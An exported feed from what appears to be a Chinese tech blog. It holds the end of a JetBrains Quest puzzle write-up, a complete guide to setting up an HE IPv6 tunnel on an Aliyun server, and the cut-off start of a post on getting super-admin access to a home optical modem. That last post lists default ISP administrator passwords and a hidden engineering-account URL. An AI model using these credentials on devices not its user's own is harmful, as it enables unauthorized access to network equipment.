punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><br><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>访问 <a href="https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/" target="_blank" rel="noopener">https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/</a></p><p>重点关注 <code>Haskell language</code>，<code>Hello,World!</code>，<code>hackathon lego brainstorms project</code>。</p><p>看来就与这张图有关了呢！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-5.png" alt="Step5"></p><p>看来就是右边图上这段话了。emmm</p><pre><code>d1D joo KN0w J378r41n2 12 4lw4y2 H1R1Ng? ch3ck Ou7 t3h K4r33r2 P4g3 4nD 533 1f 7H3r3 12 4 J08 0R 4 KW35T 0 cH4Ll3n93 70 g0 fUr7h3r @ 13457.</code></pre><p>草（一种植物），我大概翻译出来了！</p><pre><code>Did you know jetbrains is always hiring?Check Out the kareersPage and see if here is a job or akwest challenge togo further at least</code></pre><p>形象带师 233333</p><p>（讲真，觉得 CTF 有趣的一个原因大概就是从各种奇怪的数字大小写字母混杂的形象的 flag 开始的吧</p><p>（觉得出题人脑洞就很大</p><p>比如随手来一个 → <code>flag{1t_I5_s0_Fun_70_S33_y0u_H3r3}</code>。😁</p><p>不过这里第一次见把<code>2</code>当作<code>s</code>的。</p><p>还有<code>kareers</code>应该是<code>careers</code>，<code>kwest</code>应该是<code>quest</code>吧 23333.</p><blockquote><p>查了一下，发现原来这个叫做 <strong>Leet</strong>，又叫 <strong>黑客语</strong>。</p><p>详见 <code>VV 1 |&lt; 1 P 3 [) 1 4</code> ，<a href="https://zh.wikipedia.org/zh-cn/Leet" target="_blank" rel="noopener">click here</a>.</p></blockquote><p>所以 JB 顺便再来招个聘？</p><p>看来下一个 Step 是个与 job 有关的地方了。</p><br><h3 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h3><p>在官网上找到了 Company -&gt; Careers -&gt; Jobs.</p><p><a href="https://www.jetbrains.com/careers/jobs/" target="_blank" rel="noopener">https://www.jetbrains.com/careers/jobs/</a></p><p>搜索<code>Quest</code>，发现了一个奇怪的职位。那就是它了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-6.png" alt="Step6"></p><p>于是来到了<a href="https://www.jetbrains.com/careers/jobs/fearless-quester-356/" target="_blank" rel="noopener">这个页面</a> ↓。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester.png" alt="fearless_quester"></p><p>233333 这里回顾了一下这一路 journey 经历过的那些有意思的东西。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester2.png" alt="fearless_quester2"></p><p>到下面这里，点击按钮，会给它的邮箱发个邮件。</p><p>（<code>mailto:jobs@jetbrains.com?subject=Fearless Quester - Any - any</code></p><p>然而发现并不是啦 23333.</p><p>然后再看回 <code>To progress with your quest what you’ll need</code>。</p><p>应该是与一个游戏开发有关，查了一下 Konami games.</p><blockquote><p>日本最具影响力的游戏软件商之一，<em>KONAMI</em>（科乐美）。</p></blockquote><p>可能是有个游戏啥的？</p><br><h3 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h3><p>找了找 game develop，发现了一个<a href="https://www.jetbrains.com/gamedev/" target="_blank" rel="noopener">这个网页</a>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_development.png" alt="game_development"></p><p>然后找死找不到<code>quest</code>，难受死了。</p><p>在 Network 里找个半天也没找到嘤嘤嘤。</p><p>就在一脸懵逼的时候，想起来好像没有用 Chrome 的无痕模式（（</p><blockquote><p>后来发现是我的浏览器开了弹窗拦截，把找个也给误拦截了emmm。</p></blockquote><p>再一搜，发现了相关的 js 文件。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-7.png" alt="Step7"></p><br><h3 id="Beat-The-Quest-1"><a href="#Beat-The-Quest-1" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>在<code>block-breaker.js</code> 这个文件里搜索<code>quest</code>，发现了第二个 quest 的 code ↓。</p><p><em>（可能这个也是非预期解了23333</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/block-breakerJS.png" alt="block-breaker_JS"></p><pre><code>"\n        |\n        |\n        |   Congratulations you have beat the second quest.\n        |   Use the code key GamesAreFun on the\n        |   quest page https://jb.gg/quest to claim your prize.\n        |     \n    "</code></pre><p>所以 Code 就是 <code>GamesAreFun</code> 啦~</p><p>拿着它去 <a href="https://jb.gg/quest" target="_blank" rel="noopener">https://jb.gg/quest</a> 换新的授权吧嘻嘻嘻。</p><p>发现也是跳转到之前的那个页面（ <a href="https://www.jetbrains.com/promo/quest/" target="_blank" rel="noopener">https://www.jetbrains.com/promo/quest/</a> ）。</p><p>同样输入邮箱和 Code 就好了。</p><p>又得到3个月的免费授权！上面说了可以叠加使用。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Beat_quest2.png" alt="Beat_quest2"></p><blockquote><p>You have passed the second quest and have proven yourself a worthy contender for our devious puzzles. We have one last quest in this series for you. It will be the ultimate quest, and it will secure your place in the halls of JetBrains Quest legend.</p><p><strong>A little @jetbrains bird will deliver the next clue – so do some birdwatching,</strong></p></blockquote><p>噫！还有<strong>一个终极的 quest</strong> 等着大家呢！</p><p>猜一猜是不是六个月的授权，然后凑成一整年呢哈哈哈哈哈。</p><hr><p>然后在邮件结尾又发现了 Leet，就是 Step5 中提到的那个黑客语。这才发现原来 Quest1 的邮件中也有。</p><p>可能这也算是一个暗示/hint 吧！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/email_leet.png" alt="email_leet"></p><pre><code>Y0U H4V3 R3C13V3D 7H15 3M41L B3C4U53 Y0U H4V3 P4RT1C1P4T3D 1N J3TBR41N5 QU35T</code></pre><p>这里还可以取消邮件订阅啥的，应该还算挺友好的吧。</p><br><br><h3 id="Step7-中-game-dev-页面的游戏解法"><a href="#Step7-中-game-dev-页面的游戏解法" class="headerlink" title="Step7 中 game dev 页面的游戏解法"></a>Step7 中 game dev 页面的游戏解法</h3><p>再回去看一下这个游戏到底啥回事。结合再上一步中的提示。</p><blockquote><p><strong>To progress with your quest what you’ll need:</strong></p><ul><li>To check out what we have for game developers.</li><li>Be geeky enough to remember how you used to cheat at Konami games.</li><li>Try cheating on the page.</li></ul></blockquote><p>看了一下别人的讨论，才大概明白这个的意思。</p><p>他是想让你用在 Konami games 里积累的技巧来唤出游戏界面，然后尝试完成游戏，或者尝试在网页中作弊完成（可能是上面的非预期解吧）。</p><p>根据别人的说法，<strong>在网页里</strong>通过依次按下键盘上的 <code>上上下下左右左右BA</code> 这几个键，就能唤出游戏界面了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game_start.png" alt="游戏开始界面"></p><p>原来就是个弹球游戏啊 23333. 而且球掉了还可以继续玩。</p><p>看了一下是通过一个 canvas 来实现的。</p><p>把条块消除得差不多就看到 code key 啦！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/game.png" alt="game"></p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉 JetBrains 的这两个 Quest 难度还好，还是挺友好的。</p><p>于是就白嫖了总共六个月的 JB 全家产品免费授权。</p><p>（不过之前就有教育邮箱的免费授权呢</p><p>所以通过这个 Quest，让我们更深入地了解了 JB？说不定还能顺便招聘？</p><p>（这大概是其本意吧？（盲猜</p><p>注意一下上面的内容<strong>仅供学习研究</strong>，转载的话记得留下本文链接呢。</p><p>欢迎一起交流嘻嘻嘻。</p><p>（溜了溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用TunnelBroker给阿里云ECS配置公网IPv6</title>
      <link href="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/"/>
      <url>/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>目前 IPv6 用得挺广了吧，很多应用都支持 IPv6 了，三大运营商基本都支持了，联通的流量自带 IPv6，而且开热点的话还支持下发给其他设备。</p><p>不过其实很多服务器都没上 IPv6，比如阿里云的 ECS 一般公网只有 IPv4 地址（想拥有一个 IPv6 地址还得再花钱）。</p><p>于是最近就折腾了一下，利用 Hurricane Electric 提供的<strong>免费 IPv6 Tunnel Broker</strong>，让阿里云的 ECS 拥有了 IPv6 地址（非原生），理论上大部分服务器都适用的。</p><p>这里用到的是 IPv6 Tunnel，基于 <strong>protocol-41 (6in4)</strong>，其实是把 IPv6 包通过 IPv4 包来传输，相当于建立在网络层上的代理，需要你的服务器的操作系统支持，而且要有一个<strong>相对固定的公网 IPv4 地址</strong>。</p><blockquote><p>When using 6to4, you do not transmit IPv6 packets. Instead, special IPv4 packets are wrapped around IPv6 payloads. These packets have IPv4  protocol 41, as defined by RFC 2473.</p></blockquote><p>当然，性能的话肯定比不上原生的 IPv6 了，不过自己玩玩还好，问题不大吧。</p><hr><h2 id="0x01-申请-IPv6-Tunnel-Broker"><a href="#0x01-申请-IPv6-Tunnel-Broker" class="headerlink" title="0x01 申请 IPv6 Tunnel Broker"></a>0x01 申请 IPv6 Tunnel Broker</h2><p>前往 <a href="https://tunnelbroker.net" target="_blank" rel="noopener">https://tunnelbroker.net</a>，注册一个你自己的账号。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/register.png" alt="注册账号"></p><p>登录之后，点击左侧的 <a href="https://www.tunnelbroker.net/new_tunnel.php" target="_blank" rel="noopener">Create Regular Tunnel</a>。</p><p>一个账号最多可以创建5条tunnel。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/create_tunnel.png" alt="创建隧道"></p><p>IPv4 Endpoint 里填<strong>服务器的公网地址</strong>，输入后会自动检查是否支持。</p><p>You are viewing from 显示的是你访问网站的公网 IPv4 地址，如果是在服务器上访问的话 Endpoint 就是这个了。</p><p><strong>注意：</strong>服务器要<strong>允许来自 HE 的 ICMP 请求</strong>，也就是说不能禁止来自 HE 的 ping。</p><p>（这里借一张网上的图，比如下面这样的↓</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ICMP_blocked.png" alt="icmp_block"></p><p>Available Tunnel Servers 里选择离你服务器较近的，可以在服务器上ping试一试。</p><p>现在显示 <code>Los Angeles, CA, US Not Available (Full)</code>，洛杉矶的都满了233.</p><p>Asia 有 HK、SG、JP 这三个节点，不过据网上说貌似速度也不怎么样了，具体自己看看吧。</p><p>选择好之后就点击<strong>创建隧道</strong>就申请好了。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/tunnel_details.png" alt="tunnel_details"></p><p>这里的 Client IPv4 Address 是你之前填的地址，点击可以进行修改，</p><p><strong>Client IPv6 Address</strong> 就是你服务器的<strong>公网IPv6地址</strong>了，如果需要DNS解析的话就给这个地址加个 AAAA 解析就行（注意不需要加上<code>/64</code>）。</p><p>这里的 Routed IPv6 Prefixes 是该隧道可用于分配的 IPv6 地址段，可为内网机器都分配上唯一的 IPv6 地址。</p><p>可见分配的是 <code>/64</code>，即 IPv6 地址的前缀长度为64位。后（128-64=）64位为网络接口ID（可理解为设备在网络上的唯一ID），因此你有2^64（1844亿亿）个可用的IP地址了。😉</p><p>当然你还可以申请一个<code>/48</code>前缀的路由，这样可用的地址更多了。（2^80个）</p><hr><h2 id="0x02-阿里云-ECS-开启-IPv6"><a href="#0x02-阿里云-ECS-开启-IPv6" class="headerlink" title="0x02 阿里云 ECS 开启 IPv6"></a>0x02 阿里云 ECS 开启 IPv6</h2><p>阿里云的硬盘镜像默认是把 IPv6 给关掉的，这里就手动打开好了。</p><pre class=" language-bash"><code class="language-bash">vim /etc/sysctl.conf</code></pre><p>在文件末尾的位置把ipv6设置中的1改成0，变成类似如下的亚子。</p><pre><code>net.ipv6.conf.all.disable_ipv6 = 0net.ipv6.conf.default.disable_ipv6 = 0net.ipv6.conf.lo.disable_ipv6 = 0net.ipv6.conf.eth0.disable_ipv6 = 0</code></pre><p>而后重新载入配置。</p><pre class=" language-bash"><code class="language-bash">sysctl -p</code></pre><p>然后使用<code>ifconfig</code>看一看，就会发现支持 IPv6 了。</p><p>比如下面这个，有了<code>inet6</code>这一项。</p><pre><code>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.xxx.xxx.xxx  netmask 255.255.240.0  broadcast 172.xxx.xxx.xxx        inet6 fe80::xxxx:xxxx:xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:16:xx:xx:xx:xx  txqueuelen 1000  (以太网)        RX packets 1688753  bytes 328028654 (328.0 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 1837158  bytes 637871915 (637.8 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><hr><h2 id="0x03-给-ECS-配置-IPv6-隧道"><a href="#0x03-给-ECS-配置-IPv6-隧道" class="headerlink" title="0x03 给 ECS 配置 IPv6 隧道"></a>0x03 给 ECS 配置 IPv6 隧道</h2><p>在Example Configuration 里有很多示例。</p><p>比如Ubuntu的。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration.png" alt="interface_configuration"></p><pre class=" language-bash"><code class="language-bash">vim /etc/network/interfaces</code></pre><pre><code>auto he-ipv6iface he-ipv6 inet6 v4tunnel        address 2001:470:xxxx:xxxx::2        netmask 64        endpoint 216.218.xxx.xxx        local 172.16.xxx.xxx        ttl 255        gateway 2001:470:xxxx:xxxx::1</code></pre><p>将上面的配置粘贴到文件的最后。</p><p>注意一下，<strong>内网环境要用内网的IP！</strong>他这里也写清楚了的。</p><blockquote><p><strong>NOTE:</strong> When behind a firewall appliance that passes protocol 41,  use the IPv4 address you get from your appliance’s DHCP service instead  of the IPv4 endpoint you provided to our broker.</p></blockquote><p><strong>注意：</strong> 阿里云的 ECS 要<strong>将local中的IP修改为内网的IP</strong>，即私网IP地址，例如<code>172.16.xxx.xxx</code>，而不是公网IP！！！</p><p>不清楚的话还可以参考<strong>Ubuntu的Wiki</strong>，<a href="https://wiki.ubuntu.com/IPv6#Get_connected_with_Hurricane_Electric" target="_blank" rel="noopener">戳这里</a>。</p><p>而后<strong>让IPv6生效</strong>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifup</span> he-ipv6</code></pre><p>再看一下 <code>ifconfig</code>，这时应该有一个 <code>he-ipv6</code>的了！类似这样的。</p><pre><code>he-ipv6: flags=209&lt;UP,POINTOPOINT,RUNNING,NOARP&gt;  mtu 1480          inet6 2001:470:xxxx:xxxx::2  prefixlen 64  scopeid 0x0&lt;global&gt;          inet6 fe80::xxxx:xxxx  prefixlen 64  scopeid 0x20&lt;link&gt;          sit  txqueuelen 1000  (IPv6-in-IPv4)          RX packets 11605  bytes 3127821 (3.1 MB)          RX errors 0  dropped 0  overruns 0  frame 0          TX packets 13811  bytes 2403522 (2.4 MB)          TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p><em>P.S.:</em></p><p>如果想<strong>让隧道失效</strong>（没有删除的话重启后还是会自动启用）：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ifdown</span> he-ipv6</code></pre><p>如果想<strong>删除隧道</strong>：</p><pre class=" language-bash"><code class="language-bash">ip tunnel del he-ipv6</code></pre><p>如果已经生效了会提示：<code>ifup: interface he-ipv6 already configured</code>。</p><p>如果设置出错了，或者想修改配置，需要先删除隧道，再重新生效就好。</p><p>现在就来<strong>测试一下</strong>吧！</p><pre class=" language-bash"><code class="language-bash">root@miaoTony:~<span class="token comment" spellcheck="true"># ping6 -c 5 ipv6.google.com</span>PING ipv6.google.com<span class="token punctuation">(</span>tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">))</span> 56 data bytes64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>1 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>393 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>2 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>390 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>3 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>390 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>4 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>393 ms64 bytes from tsa03s02-in-x0e.1e100.net <span class="token punctuation">(</span>2404:6800:4008:803::200e<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>5 ttl<span class="token operator">=</span>53 time<span class="token operator">=</span>388 ms--- ipv6.google.com <span class="token function">ping</span> statistics ---5 packets transmitted, 5 received, 0% packet loss, <span class="token function">time</span> 4003msrtt min/avg/max/mdev <span class="token operator">=</span> 388.107/391.132/393.213/1.914 ms</code></pre><p>当然也可以 <code>ping6 ipv6.baidu.com</code>。</p><p>如果不成功可以重启系统试试。</p><hr><p>当然，你也可以尝试在命令行中进行配置（略）。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/interface_configuration2.png" alt="interface_configuration2"></p><p>Windows 10 下的配置，在 cmd 中执行下面的命令。</p><pre><code>netsh interface teredo set state disablednetsh interface ipv6 add v6v4tunnel interface=IP6Tunnel localaddress=172.16.xxx.xxx remoteaddress=216.218.xxx.xxxnetsh interface ipv6 add address interface=IP6Tunnel address=2001:470:xx:xxxx::2netsh interface ipv6 add route prefix=::/0 interface=IP6Tunnel nexthop=2001:470:xx:xxxx::1</code></pre><p>注意修改对应的IP地址。</p><hr><h2 id="0x04-一些问题的解决"><a href="#0x04-一些问题的解决" class="headerlink" title="0x04 一些问题的解决"></a>0x04 一些问题的解决</h2><p><strong>按照上面一番配置好</strong>之后，有可能还是访问不了 IPv6 的网站。</p><p><strong>有可能</strong>需要如下处理吧。<em>（谁知道会这么麻烦呢</em></p><p>要是没事了就直接往下看了。</p><ul><li>需要放行服务器的41端口。毕竟流量是通过IPv4传输的啦。</li></ul><p>例如：</p><pre class=" language-bash"><code class="language-bash">ufw allow 41</code></pre><p>或者</p><pre class=" language-bash"><code class="language-bash">iptables -t filter -I INPUT -p 41 -j ACCEPTiptables -t filter -I OUTPUT -p 41 -j ACCEPT</code></pre><p>同时要记得在（阿里云的）<strong>安全组里放行</strong>。</p><ul><li>配置好 IPv6 的 DNS</li></ul><pre class=" language-bash"><code class="language-bash">vim /etc/resolv.conf</code></pre><p>在最后添加谷歌的DNS服务器 </p><pre class=" language-bash"><code class="language-bash">nameserver 2001:4860:4860::8888nameserver 2001:4860:4860::8844</code></pre><p>或者国内的公共DNS：<code>240c::6666</code> 或 <code>240c::6644</code></p><ul><li>添加路由</li></ul><pre class=" language-bash"><code class="language-bash">route -A inet6 add ::/0 dev he-ipv6</code></pre><p>再 ping 一下应该可以了吧（</p><p>不行再重启试试（重启解决绝大部分问题呢</p><hr><h2 id="0x05-Nginx-支持-IPv6-访问"><a href="#0x05-Nginx-支持-IPv6-访问" class="headerlink" title="0x05 Nginx 支持 IPv6 访问"></a>0x05 Nginx 支持 IPv6 访问</h2><p>修改配置文件，监听 IPv6 端口。</p><pre><code>server {  listen 80;  listen [::]:80; // 监听 IPv6 的 80 端口  # ...}server {  listen 443 ssl http2;   listen [::]:443 ssl http2; // 监听 IPv6 的 443 端口  # ...}</code></pre><p>然而，发现一个情况，只有当服务器访问IPv6的网站的时候，或者说有 IPv6 流量的时候，外网才能通过这个公网的IPv6地址访问到服务器emmm。（懵 </p><p>于是加一个 cron 计划，定时ping一下好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">crontab</span> -e</code></pre><p>添加一个计划。</p><pre><code>*/1 * * * * ping6 -c 1 he.net</code></pre><p>重启 cron 使其生效。</p><pre class=" language-bash"><code class="language-bash">systemctl restart <span class="token function">cron</span></code></pre><p>每分钟执行一次 ping 操作，这样访问就没问题了。</p><p><em>（不过想不大明白为啥这个通道会自动断开。有人说与 ip6tables 有关，不大清楚。。 emmm</em></p><hr><h2 id="0x06-配置-DNS"><a href="#0x06-配置-DNS" class="headerlink" title="0x06 配置 DNS"></a>0x06 配置 DNS</h2><p>配置一条<strong>AAAA记录指向公网的 IPv6 地址</strong>即可。可以试试开启CDN。</p><p>而后就可以通过域名访问网站了。</p><p>不过没有 CDN 的话只能通过 IPv6 进行访问。</p><hr><h2 id="0x07-检查网站是否支持-IPv6"><a href="#0x07-检查网站是否支持-IPv6" class="headerlink" title="0x07 检查网站是否支持 IPv6"></a>0x07 检查网站是否支持 IPv6</h2><p>利用 <a href="http://ipv6-test.com/validate.php" target="_blank" rel="noopener">http://ipv6-test.com/validate.php</a></p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/ipv6test.png" alt="ipv6test"></p><hr><h2 id="0x08-自动更新-Endpoint-IP"><a href="#0x08-自动更新-Endpoint-IP" class="headerlink" title="0x08 自动更新 Endpoint IP"></a>0x08 自动更新 Endpoint IP</h2><p>前面说只要公网的IPv4地址<strong>相对固定</strong>就好了，这里就这个意思啦。</p><p>HE 还支持<strong>为动态 IPv4 地址建立 IPv6 通道</strong>，这里要用到他提供的API了。</p><blockquote><p>We’ve added support for Dyn-compliant endpoint updates so that equipment talking this spec can very easily update your tunnel endpoint.</p><p><strong>Update URL:</strong> <a href="https://ipv4.tunnelbroker.net/nic/update" target="_blank" rel="noopener">https://ipv4.tunnelbroker.net/nic/update</a>  (<em>ipv4 is important here, don’t remove it</em>)<br><strong>Username:</strong> Your Tunnelbroker.net username<br><strong>Password:</strong> Tunnel specific authentication key (under Advanced on the tunnel  information page) if one is set, otherwise your Tunnelbroker.net  password.<br><strong>Hostname:</strong></p><ul><li>Numeric tunnel ID</li><li>Numeric tunnel ID in “tunnel#.tunnelbroker.net” (<em>This host does not actually exist</em>)</li><li>Tunnel reverse host, aka “user-#.tunnel.tserv#.loc#.ipv6.he.net”</li></ul></blockquote><p>或者也可以访问更新的URL。</p><p>就可以在服务器上写个脚本检查公网地址有没有更新就好了。</p><p><img src="/2020/03/03/Server_ObtainIPv6ViaTunnelBroker/Dynamic_Update.png" alt="动态更新"></p><p><strong>自动更新IPv4地址：</strong></p><p>To auto-detect your IPv4 address:</p><pre><code>https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;</code></pre><p><strong>手动指定更新的IPv4地址：</strong></p><p>To manually specific your IPv4 address:</p><pre><code>https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt;</code></pre><p><strong>当然不想看的话就看完整版：</strong></p><p><strong>TL;DR:</strong>（<code>Too long; Don't read</code>/ <code>Too long; Didn't read</code>）</p><pre><code>http[s]://[TB_USER:TB_PASS@]tunnelbroker.net/nic/update?[username=TB_USER&amp;password=TB_PASS&amp;]hostname=&lt;TUNNEL_ID|tunnelTUNNEL_ID.tunnelbroker.net|TB_USER-TUNNEL_LABEL.tserv#.LOC#.ipv6.he.net&gt;[&amp;myip=IPV4]</code></pre><p>后面可以试一试这个功能 hhhh</p><p>当然了，HE还自带了 DNS 解析，可以尝试一下呢。</p><p>下面还有一些关于 IPv6 的拓展的链接。</p><p>好了就这样吧。</p><p>（溜了溜了</p><h2 id="Reference-amp-Extensive-Reading"><a href="#Reference-amp-Extensive-Reading" class="headerlink" title="Reference &amp; Extensive Reading"></a>Reference &amp; Extensive Reading</h2><p><a href="https://blog.csdn.net/kaikai0803/article/details/94615666" target="_blank" rel="noopener">记一次给线上服务器添加IPv6支持的步骤</a></p><p><a href="https://wzfou.com/he-net-dns/" target="_blank" rel="noopener">He.net DNS域名解析申请使用-免费DDNS、IPv6 地址和Slave DNS</a></p><p><a href="https://www.uulucky.com/show-224057.html" target="_blank" rel="noopener">申请 HE.NET IPv6 隧道以使主机支持 IPv6</a>  </p><p><a href="https://www.yorkchou.com/servarica.html" target="_blank" rel="noopener">Servarica IPv6 Only VPS折腾体验</a></p><p><a href="https://www.bobobk.com/377.html" target="_blank" rel="noopener">如何给阿里云ecs开启ipv6访问</a></p><p><a href="http://www.yaocheap.com/phptec/817.html" target="_blank" rel="noopener">阿里云centos6.8开启ipv6通过appstore审核的方法</a></p><p><a href="https://www.cnblogs.com/gscq073240/articles/7677345.html" target="_blank" rel="noopener">阿里云服务器以及CDN支持IPV6的方法</a></p><p><a href="https://forums.he.net/index.php?topic=1994.msg11842#msg11842" target="_blank" rel="noopener">Dyn-compliant Endpoint Updates</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> Configuration </tag>
            
            <tag> IPv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>光猫折腾记 | 获取超级管理员密码&amp;开启telnet&amp;IPv6&amp;桥接宽带</title>
      <link href="/2020/02/27/Server_OpticalModem/"/>
      <url>/2020/02/27/Server_OpticalModem/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近觉得家里的网速有点慢，上着网课或者看着视频，WiFi 连接的设备同时在用的话就开始卡了 emmm就很难受。🙁</p><p>然后又听说三大运营商的宽带差不多都分配 IPv6 了，手机的话联通流量分配 IPv6 地址也有一段时间了，开热点还能下发 IPv6 到其他设备（然鹅我这里的移动好像还没有）。</p><p>于是就想折腾一下家里的光猫/路由器，反正就是瞎折腾吧。</p><p>这个光猫是有点年纪的 <strong>HG260GS-U</strong>，烽火家的。 硬件版本 <strong>BCM.V2.0</strong> ，软件版本 <strong>G00Y1.00M0001</strong> 。</p><p>大概的内容就是——</p><p>获取了超级管理员密码，开启了 Telnet 管理，启用了 IPv6，并尝试了宽带桥接的改造等等。</p><br><hr><h2 id="0x01-获取超级管理员密码"><a href="#0x01-获取超级管理员密码" class="headerlink" title="0x01 获取超级管理员密码"></a>0x01 获取超级管理员密码</h2><p>通过光猫的管理地址连接到管理页面，一般是 <code>192.168.1.1</code>。登录界面如下。</p><p><img src="/2020/02/27/Server_OpticalModem/login.png" alt="login"></p><p>光猫背面有一个 user 用户的信息，登录之后的界面功能贼少，只能看一下连接状态，设置一下WIFI、静态路由之类的基础配置，连宽带连接都设置不了。</p><p>于是想到通过超级管理员进行登录。</p><p>在网上搜了各种通用密码，比如用户名、密码分别为</p><blockquote><p>CUAdmin  CUAdmin</p><p>telecomadmin  nE7jA%5m</p><p>CMCCadmin  aDm8H%MdA</p><p>fiberhomehg2x0  hg2x0  （工程账号）</p></blockquote><p>有可能登录是这个网址：<a href="http://192.168.1.1/cu.html" target="_blank" rel="noopener">http://192.168.1.1/cu.html</a></p><p><strong>然而都没有用！</strong></p><p>哦对了，这个工程账号（据说是隐藏用户）这样开启：</p><p>访问 <a href="http://192.168.1.1/logoffaccount.html" target="_blank" rel="noopener">http://192.168.1.1/logoffaccount.html</a> ，将<strong>隐藏用户</strong>设置为<strong>启用</strong>，而后点击<strong>保存/应用</strong>即可。</p><p><img src="/2020/02/27/Server_OpticalModem/hidden_user.png" alt="hidden_user"></p><p><strong><em>（然而我这里没用</em></strong></p><p>于是看了看网上大佬们的骚操作，发现可以通过<strong>备份设置</strong>的办法获取到超级管理员账号及密码。</p><h3 id="Step-1-以普通用户身份登录光猫"><a href="#Step-1-以普通用户身份登录光猫" class="headerlink" title="Step 1 以普通用户身份登录光猫"></a>Step 1 以普通用户身份登录光猫</h3><p>就是光猫背后的那个用户名密码啦。</p><h3 id="Step-2-下载设置备份文件"><a href="#Step-2-下载设置备份文件" class="headerlink" title="Step 2 下载设置备份文件"></a>Step 2 下载设置备份文件</h3><p>访问 